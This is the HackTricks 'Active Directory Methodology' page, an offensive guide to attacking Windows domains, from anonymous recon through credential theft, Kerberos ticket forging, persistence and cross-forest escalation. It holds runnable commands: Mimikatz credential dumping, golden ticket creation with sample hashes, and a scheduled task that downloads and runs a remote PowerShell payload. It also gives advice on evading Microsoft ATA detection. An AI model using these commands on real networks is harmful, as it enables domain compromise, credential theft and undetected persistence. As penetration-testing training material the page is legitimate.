# Active Directory Methodology

If you want to **know** about my **latest modifications**/**additions** or you have **any suggestion for HackTricks or PEASS**, **join the** [**💬**](https://emojipedia.org/speech-balloon/) ****[**PEASS & HackTricks telegram group here**](https://t.me/peass), or **follow me on Twitter** [🐦](https://emojipedia.org/bird/)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**  
If you want to **share some tricks with the community** you can also submit **pull requests** to **\*\*\[**[https://github.com/carlospolop/hacktricks\*\*\]\(https://github.com/carlospolop/hacktricks](https://github.com/carlospolop/hacktricks**]%28https://github.com/carlospolop/hacktricks)\) **\*\*that will be reflected in this book.  
Don't forget to** give ⭐ on the github\*\* to motivate me to continue developing this book.

## Basic overview

Active Directory allows network administrators to create and manage domains, users, and objects within a network. For example, an admin can create a group of users and give them specific access privileges to certain directories on the server. As a network grows, Active Directory provides a way to organize a large number of users into logical groups and subgroups, while providing access control at each level.

The Active Directory structure includes three main tiers: 1\) domains, 2\) trees, and 3\) forests. Several objects \(users or devices\) that all use the same database may be grouped in to a single domain. Multiple domains can be combined into a single group called a tree. Multiple trees may be grouped into a collection called a forest. Each one of these levels can be assigned specific access rights and communication privileges.

Main concepts of an Active Directory:

1. **Directory** – Contains all the information about the objects of the Active directory
2. **Object** – An object references almost anything inside the directory \(a user, group, shared folder...\)
3. **Domain** – The objects of the directory are contained inside the domain. Inside a "forest" more than one domain can exist and each of them will have their own objects collection. 
4. **Tree** – Group of domains with the same root. Example: _dom.local, email.dom.local, www.dom.local_
5. **Forest** – The forest is the highest level of the organization hierarchy and is composed by a group of trees. The trees are connected by trust relationships.

Active Directory provides several different services, which fall under the umbrella of "Active Directory Domain Services," or AD DS. These services include:

1. **Domain Services** – stores centralized data and manages communication between users and domains; includes login authentication and search functionality
2. **Certificate Services** – creates, distributes, and manages secure certificates
3. **Lightweight Directory Services** – supports directory-enabled applications using the open \(LDAP\) protocol
4. **Directory Federation Services** – provides single-sign-on \(SSO\) to authenticate a user in multiple web applications in a single session
5. **Rights Management** – protects copyrighted information by preventing unauthorized use and distribution of digital content
6. **DNS Service** – Used to resolve domain names.

AD DS is included with Windows Server \(including Windows Server 10\) and is designed to manage client systems. While systems running the regular version of Windows do not have the administrative features of AD DS, they do support Active Directory. This means any Windows computer can connect to a Windows workgroup, provided the user has the correct login credentials.  
**From:** [**https://techterms.com/definition/active\_directory**](https://techterms.com/definition/active_directory)\*\*\*\*

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.  
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)\*\*\*\*

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io/) to have a quick view of which commands you can run to enumerate/exploit an AD.

## Recon Active Directory \(No creds/sessions\)

If you just have access to an AD environment but you don't have any credentials/sessions you could:

* **Pentest the network:** Scan the network, find machines and open ports and try to **exploit vulnerabilities** or **extract credentials** from them \(for example, **\*\*\[**printers could be very interesting targets**\]\(ad-information-in-printers.md\)\). Take a look to the General \*\***[**Pentesting Methodology**](../../pentesting-methodology.md) _\*\*_to find more information about how to do this.
* **Check for null and Guest access on smb services** \(this won't work on modern Windows versions\):
  * `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  * `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  * `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  * [**A more detailed guide on how to enumerate a SMB server can be found here.**](../../pentesting/pentesting-smb.md)\*\*\*\*
* **Enumerate Ldap**:
  * `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  * [**A more detailed guide on how to enumerate LDAP can be found here.**](../../pentesting/pentesting-ldap.md)\*\*\*\*
* **Poison the network**
  * Gather credentials [**impersonating services with Responder**](../../pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)\*\*\*\*
  * Access host by **\*\*\[**abusing the relay attack**\]\(../../pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md\#relay-attack\)**.\*\*
  * Gather credentials **exposing** [**fake UPnP services with evil-S**](../../pentesting/pentesting-network/spoofing-ssdp-and-upnp-devices.md)\*\*\*\*[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)\*\*\*\*
* **OSINT**: Try to **extract possible usernames** from services \(mainly web\) inside the domain environments and also from the publicly available web pages of the company. If you find the complete names of company workers, you could try different AD **username conventions \(**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)**\)**. The most common conventions are: _NameSurname_, _Name.Surname_, _NamSur_ \(3letters of each\), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ \(abc123\). You could also try **statistically most used usernames**: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) **Read the following Username enumeration section to learn how to find if a username is valid or not.**

### User enumeration

When an **invalid username is requested** the server will respond using the **Kerberos error** code _**KRB5KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN**_, allowing us to determine that the username was invalid. **Valid usernames** will illicit either the **TGT in a AS-REP** response **or** the error _**KRB5KDC\_ERR\_PREAUTH\_REQUIRED**_, indicating that the user is required to perform pre-authentication.

```text
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>
msf> use auxiliary/gather/kerberos_enumusers
./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
enum4linux -U 10.10.10.161 | grep 'user:' | sed 's/user:\[//g' | sed 's/\]//g' | awk '{print $1}'
```

You could also use the **impacket script of ASREPRoast** to enumerate valid usernames.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords...Then try:

* \*\*\*\*[**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _**DONT\_REQ\_PREAUTH**_ you can **request a AS\_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
* \*\*\*\*[**Password Spraying**](password-spraying.md): Let's **try** the most **common passwords** with each of the discovered users, maybe some user is using a bad password \(keep in mind the password policy\)
* A final option if the accounts cannot be locked is the **\*\*\[**traditional bruteforce**\]\(password-spraying.md\)** \(be careful\)\*\*.

## Enumerating Active Directory \(Some creds/Session\)

For this phase you need to have **compromised the credentials or a session of a valid domain account.**

### Enumeration

If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.  
Regarding [**ASREPRoast** ](asreproast.md)you can now find every possible vulnerable user, and regarding **\*\*\[**Password Spraying**\]\(password-spraying.md\) you can get a** list of all the usernames **and try the password of the compromised account \(if you know it\). It's very easy to obtain all the domain usernames from Windows \(`net user /domain` ,`Get-DomainUser`or `wmic useraccount get name,sid`\). In** linux\*\* you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username`

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

* You could use some[ Windows binaries from the CMD to perform a basic recon](../basic-cmd-for-pentesters.md#domain-info), but using [powershell for recon](../basic-powershell-for-pentesters/) will probably be stealthier, and you could even [**use powerview**](../basic-powershell-for-pentesters/powerview.md) **to extract more detailed information**. Always **learn what a CMD or powershell/powerview command does** before executing it, this way you will know **how stealth are you being**.
* Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** \(depending on the collection methods you use\), but **if you don't care** about that, you should totally give it a **try**.
* If you are using **Linux**, you could also [enumerate the domain using **pywerview**](https://github.com/the-useless-one/pywerview)**.**
* You could also **try** [**https://github.com/tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)\*\*\*\*

**Even if this Enumeration section looks small this is the most important part of all. Access the links \(mainly the one of cmd, powershell, powerview and BloodHound\), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.**

### **Kerberoast**

The goal of **Kerberoasting** is to harvest **TGS tickets for services that run on behalf of user accounts** in the AD, not computer accounts. Thus, **part** of these TGS **tickets** are **encrypted** with **keys** derived from user passwords. As a consequence, their credentials could be **cracked offline**.  
You can know that a **user account** is being used as a **service** because the property **"ServicePrincipalName"** is **not null**.  
**Find more information about this attack** [**in the Kerberoast page**](kerberoast.md)**.**

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally**. This is because only with admin privileges you will be able to **dump hashes of other users** in memory \(LSASS\) and locally \(SAM\).  
There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/) and a **\*\*\[**checklist**\]\(../checklist-windows-privilege-escalation.md\). Also, don't forget to try \*\***[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Win-RM

Once you have obtained some credentials you could check if you have **access** to any **machine** using the **win-rm service**.  
[**More information about how to use and abuse win-rm here.**](../../pentesting/5985-5986-pentesting-winrm.md)\*\*\*\*

## Privesc on Active Directory \(Some "privileged" Creds/Session\)

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopefully you have managed to **compromise some local admin** account using [ASREPROast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), [EvilSSDP](../../pentesting/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [Enumerating](./#enumerating-active-directory)... or [escalating privileges locally](../windows-local-privilege-escalation/).  
Then, its time to dump all the hashes in memory and locally.  
[**Read this page about different ways to obtain the hashes.**](../stealing-credentials/)\*\*\*\*

### **Pass the Hash**

**Once you have the hash of a user**, you can use it to **impersonate** it.  
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.  
**\*\*\[**More information about this attack and about how does NTLM works here._\*\]\(../ntlm/\#pass-the-hash\)\_\*\*\*

### **Over Pass the Hash/Pass the Key**

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.  
[**More information about Over Pass the Hash/Pass the Key here.**](over-pass-the-hash-pass-the-key.md)\*\*\*\*

### **Pass the Ticket**

This attack is similar to Pass the Key, but instead of using hashes to request a ticket, the **ticket itself is stolen** and used to authenticate as its owner.  
**\*\*\[**More information about Pass the Ticket here._\*\]\(pass-the-ticket.md\)\_\*\*\*

### **MSSQL Trusted Links**

If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host \(if running as SA\).  
Also, if a MSSQL instance is trusted \(database link\) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. These trusts can be chained and at some point the user might be able to find a misconfigured database where he can execute commands.  
**The links between databases work even across forest trusts.**  
[**More information about this technique here.**](mssql-trusted-links.md)\*\*\*\*

### **Unconstrained Delegation**

**If you find any Computer object with the attribute** [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300%28v=vs.85%29.aspx) and you have domain privileges in the computer, you will be able to dump TGTs from memory of every users that logins onto the computer.  
So, if a **Domain Admin logins onto the computer**, you will be able to dump his TGT and impersonate him using [Pass the Ticket](pass-the-ticket.md).  
Thanks to constrained delegation you could even **automatically compromise a Print Server** \(hopefully it will be a DC\).  
[**More information about this technique here.**](unconstrained-delegation.md)\*\*\*\*

### **Constrained Delegation**

If a user or computer is allowed for "Constrained Delegation" it will be able to **impersonate any user to access some services in a computer**.  
Then, if you **compromise the hash** of this user/computer you will be able to **impersonate any user** \(even domain admins\) to access some services.  
[**More information about this attacks and some constrains here.**](constrained-delegation.md)\*\*\*\*

### **ACLs Abuse**

The compromised user could have some **interesting privileges over some domain objects** that could let you **move** laterally/**escalate** privileges.  
[**More information about interesting privileges here.**](acl-persistence-abuse.md)\*\*\*\*

### Printer Spooler service abuse

If you can find any **Spool service listening** inside the domain, you may be able to **abuse** is to **obtain new credentials** and **escalate privileges**.  
[**More information about how to find a abuse Spooler services here.**](printers-spooler-service-abuse.md)\*\*\*\*

## **Dumping Domain Credentials**

Once you get **Domain Admin** privileges, you can **dump** all the **domain database**.

```bash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

**More information about** [**DCSync attack can be found here**](dcsync.md)**.  
More information about**[ **how to steal the NTDS.dit \(Domain database\) can be found here**](../stealing-credentials/)**.**

## **Persistence**

**Some of the techniques discussed before can be used for persistence. For example you could make a user vulnerable to** [**ASREPRoast** ](asreproast.md)**or to** [**Kerberoast**](kerberoast.md)**.**

### **Golden Ticket**

A valid **TGT as any user** can be created **using the NTLM hash of the krbtgt AD account**. The advantage of forging a TGT instead of TGS is being **able to access any service** \(or machine\) in the domain ad the impersonated user.

\*\*\*\*[**More information about Golden Ticket here.**](golden-ticket.md)\*\*\*\*

### **Silver Ticket**

The Silver ticket attack is based on **crafting a valid TGS for a service once the NTLM hash of service is owned** \(like the **PC account hash**\). Thus, it is possible to **gain access to that service** by forging a custom TGS **as any user** \(like privileged access to a computer\).  
[**More information about Silver Ticket here.**](silver-ticket.md)\*\*\*\*

### **AdminSDHolder Group**

The Access Control List \(ACL\) of the **AdminSDHolder** object is used as a template to **copy** **permissions** to **all “protected groups”** in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.  
By default, the ACL of this group is copied inside all the "protected groups". This is done to avoid intentional or accidental changes to these critical groups. However, if an attacker modifies the ACL of the group **AdminSDHolder** for example, giving full permissions to a regular user, this user will have full permissions on all the groups inside the protected group \(in an hour\).  
And if someone tries to delete this user from the Domain Admins \(for example\) in an hour or less, the user will be back in the group.  
**\*\*\[**More information about AdminSDHolder Group here._\*\]\(privileged-accounts-and-token-privileges.md\#adminsdholder-group\)\_\*\*\*

### **DSRM Credentials**

There is a **local administrator** account inside each **DC**. Having admin privileges in this machine, you can use mimikatz to **dump the local Administrator hash**. Then, modifying a registry to **activate this password** so you can remotely access to this local Administrator user.  
**\*\*\[**More information about DSRM Credentials here.\*\*\]\(dsrm-credentials.md\)

### **ACL Persistence**

You could **give** some **special permissions** to a **user** over some specific domain objects that will let the user **escalate privileges in the future**.  
[**More information about interesting privileges here.**](acl-persistence-abuse.md)\*\*\*\*

### **Security Descriptors**

The **security descriptors** are used to **store** the **permissions** an **object** have **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.  
**\*\*\[**More information about Security Descriptors here._\*\]\(security-descriptors.md\)\_\*\*\*

### Skeleton Key

**Modify LSASS** in memory to create a **master password** that will work for any account in the domain.  
[**More information about Skeleton Key here.**](skeleton-key.md)\*\*\*\*

### **Custom SSP**

[Learn what is a SSP \(Security Support Provider\) here.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)  
You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.  
**\*\*\[**More information about Custom SSP here.\*\*\]\(custom-ssp.md\)

### **DCShadow**

It registers a **new Domain Controller** in the AD and uses it to **push attributes** \(SIDHistory, SPNs...\) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.  
Note that if you use wrong data, pretty ugly logs will appear.  
**\*\*\[**More information about DCShadow here.\*\*\]\(dcshadow.md\)

## **Forest Privilege Escalation -** Domain Trusts

Microsoft considers that the **domain isn't a Security Boundary**, the **Forest is the security Boundary**. This means that **if you compromise a domain inside a Forest you are going to be able to compromise the entire Forest**.

### Basic Information

At a high level, a [**domain trust**](http://technet.microsoft.com/en-us/library/cc759554%28v=ws.10%29.aspx) establishes the ability for **users in one domain to authenticate** to resources or act as a [security principal](https://technet.microsoft.com/en-us/library/cc780957%28v=ws.10%29.aspx) **in another domain**.

Essentially, all a trust does is **linking up the authentication systems of two domains** and allowing authentication traffic to flow between them through a system of referrals.  
When **2 domains trust each other they exchange keys**, these **keys** are going to be **saved** in the **DCs** of **each domains** \(**1 key per trust direction**\) and the keys will be the base of the trust.

When a **user** tries to **access** a **service** on the **trusting domain** it will request an **inter-realm TGT** to the DC of its domain. The DC wills serve the client this **TGT** which would be **encrypted/signed** with the **inter-realm** **key** \(the key both domains **exchanged**\). Then, the **client** will **access** the **DC of the other domain** and will **request** a **TGS** for the service using the **inter-realm TGT**. The **DC** of the trusting domain will **check** the **key** used, if it's ok, it will **trust everything in that ticket** and will serve the TGS to the client.

![](../../.gitbook/assets/image%20%2865%29.png)

### Different trusts

It's important to notice that **a trust can be 1 way or 2 ways**. In the 2 ways options, both domains will trust each other, but in the **1 way** trust relation one of the domains will be the **trusted** and the other the **trusting** domain. In the last case, **you will only be able to access resources inside the trusting domain from the trusted one**.

A trust relationship can also be **transitive** \(A trust B, B trust C, then A trust C\) or **non-transitive**.

**Different trusting relationships:**

* **Parent/Child** – part of the same forest – a child domain retains an implicit two-way transitive trust with its parent. This is probably the most common type of trust that you’ll encounter.
* **Cross-link** – aka a “shortcut trust” between child domains to improve referral times. Normally referrals in a complex forest have to filter up to the forest root and then back down to the target domain, so for a geographically spread out scenario, cross-links can make sense to cut down on authentication times.
* **External** – an implicitly non-transitive trust created between disparate domains. “[External trusts provide access to resources in a domain outside of the forest that is not already joined by a forest trust.](https://technet.microsoft.com/en-us/library/cc773178%28v=ws.10%29.aspx)” External trusts enforce SID filtering, a security protection covered later in this post.
* **Tree-root** – an implicit two-way transitive trust between the forest root domain and the new tree root you’re adding. I haven’t encountered tree-root trusts too often, but from the [Microsoft documentation](https://technet.microsoft.com/en-us/library/cc773178%28v=ws.10%29.aspx), they’re created when you when you create a new domain tree in a forest. These are intra-forest trusts, and they [preserve two-way transitivity](https://technet.microsoft.com/en-us/library/cc757352%28v=ws.10%29.aspx) while allowing the tree to have a separate domain name \(instead of child.parent.com\).
* **Forest** – a transitive trust between one forest root domain and another forest root domain. Forest trusts also enforce SID filtering.
* **MIT** – a trust with a non-Windows [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domain. I hope to dive more into MIT trusts in the future.

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** \(user/group/computer\) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** \(the trust was created for this probably\).
   1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains. 

There are three **main** ways that security principals \(users/groups/computer\) from one domain can have access into resources in another foreign/trusting domain:

* They can be added to **local groups** on individual machines, i.e. the local “Administrators” group on a server.
* They can be added to **groups in the foreign domain**. There are some caveats depending on trust type and group scope, described shortly.
* They can be added as principals in an **access control list**, most interesting for us as principals in **ACEs** in a **DACL**. For more background on ACLs/DACLs/ACEs, check out the “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” whitepaper.

### Child-to-Parent forest privilege escalation

Also, notice that there are **2 trusted keys**, one for _Child --&gt; Parent_ and another one for P_arent --&gt; Child_.

```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```

```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
/domain:<Current domain>
/sid:<SID of current domain>
/sids:<SID of the Enterprise Admins group of the parent domain>
/rc4:<Trusted key>
/user:Administrator
/service:<target service>
/target:<Other domain>
/ticket:C:\path\save\ticket.kirbi
```

For finding the **SID** of the **"Enterprise Admins"** group you can find the **SID** of the **root domain** and set it in S-1-5-21_root domain_-519. For example, from root domain SID _S-1-5-21-280534878-1496970234-700767426_ the "Enterprise Admins"group SID is _S-1-5-21-280534878-1496970234-700767426-519_

[http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)

```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local 
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
```

Escalate to DA of root or Enterprise admin using the KRBTGT hash of the compromised domain:

```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'
gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local
schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```

### External Forest Domain Privilege escalation

In this case you can **sign with** the **trusted** key a **TGT impersonating** the **Administrator** user of the current domain. In this case you **won't always get Domain Admins privileges in the external domain**, but **only** the privileges the Administrator user of your current domain **was given** in the external domain.

```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
```

### Domain trust abuse mitigation

**SID Filtering:**

* Avoid attacks which abuse SID history attribute across forest trust.
* Enabled by default on all inter-forest trusts. Intra-forest trusts are assumed secured by default \(MS considers forest and not the domain to be a security boundary\).
* But, since SID filtering has potential to break applications and user access, it is often disabled.
* Selective Authentication
  * In an inter-forest trust, if Selective Authentication is configured, users between the trusts will not be automatically authenticated. Individual access to domains and servers in the trusting domain/forest should be given.

\*\*\*\*[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)\*\*\*\*

## Some General Defenses

\*\*\*\*[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)  
**Please, find some migrations against each technique in the description of the technique.**

* Not allow Domain Admins to login on any other hosts apart from Domain Controllers
* Never run a service with DA privileges
* If you need domain admin privileges, limit the time: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### Deception

* Password does not expire
* Trusted for Delegation
* Users with SPN
* Password in description
* Users who are members of high privilege groups
* Users with ACL rights over other users, groups or containers
* Computer objects
* ...
* [https://github.com/samratashok/Deploy-Deception](https://github.com/samratashok/Deploy-Deception)
  * `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`

## How to identify deception

**For user objects:**

* ObjectSID \(different from the domain\)
* lastLogon, lastlogontimestamp 
* Logoncount \(very low number is suspicious\)
* whenCreated
* Badpwdcount \(very low number is suspicious\)

**General:**

* Some solutions fill with information in all the possible attributes. For example, compare the attributes of a computer object with the attribute of a 100% real computer object like DC. Or users against the RID 500 \(default admin\).
* Check if something is too good to be true
* [https://github.com/JavelinNetworks/HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster)

### Bypassing Microsoft ATA detection

#### User enumeration

ATA only complains when you try to enumerate sessions in the DC, so if you don't look for sessions in the DC but in the rest of the hosts, you probably won't get detected.

#### Tickets impersonation creation \(Over pass the hash, golden ticket...\)

Always create the tickets using the **aes** keys also because what ATA identifies as malicious is the degradation to NTLM.

#### DCSync

If you don't execute this from a Domain Controller, ATA is going to catch you, sorry.

## More Tools

* [Powershell script to do domain auditing automation](https://github.com/phillips321/adaudit)
* [Python script to enumerate active directory](https://github.com/ropnop/windapsearch)
* [Python script to enumerate active directory](https://github.com/CroweCybersecurity/ad-ldap-enum)

![](../../.gitbook/assets/68747470733a2f2f7777772e6275796d6561636f666665652e636f6d2f6173736574732f696d672f637573746f6d5f696d616765732f6f72616e67655f696d672e706e67%20%286%29%20%284%29%20%282%29.png)

​[**Buy me a coffee here**](https://www.buymeacoffee.com/carlospolop)\*\*\*\*

